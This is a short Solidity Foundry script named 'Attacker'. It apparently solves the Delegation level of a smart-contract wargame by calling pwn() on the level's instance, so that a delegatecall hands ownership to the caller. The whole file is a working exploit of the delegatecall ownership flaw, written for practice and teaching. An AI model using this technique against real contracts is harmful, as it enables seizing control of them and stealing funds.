// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel06.sol";

contract Attacker is Script {
    Delegation level06 = Delegation(0x91576DBD1d602Ee24e090A36e5d99dB95682Be4A);

    function run() external {
        vm.startBroadcast();

        (bool success,) = address(level06).call(abi.encodeWithSignature("pwn()"));
        require(success, "delegate call failed");

        vm.stopBroadcast();
    }
}
